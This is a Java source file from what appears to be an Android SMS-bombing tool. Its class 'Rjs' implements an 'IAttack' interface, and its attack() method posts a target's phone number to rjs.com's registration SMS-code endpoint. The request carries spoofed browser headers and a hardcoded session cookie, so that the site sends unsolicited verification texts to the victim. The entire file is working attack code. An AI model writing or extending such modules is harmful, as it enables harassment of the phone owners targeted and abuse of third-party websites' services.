package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Rjs implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "smstype=16&phone="+Utils.getNumber(MainApplication.context)+"&code=7048";

        Request request = new Request.Builder()
                .url("https://www.rjs.com/member/common/getSmsCodeForRegister/")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "rjs_think_language=en-US; Hm_lvt_fba1aa2d4369acccaa2f15196bb4b194=1450270208; Hm_lpvt_fba1aa2d4369acccaa2f15196bb4b194=1450270208; PHPSESSID=bngcvpvno9be6nerp52ktalmf3")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
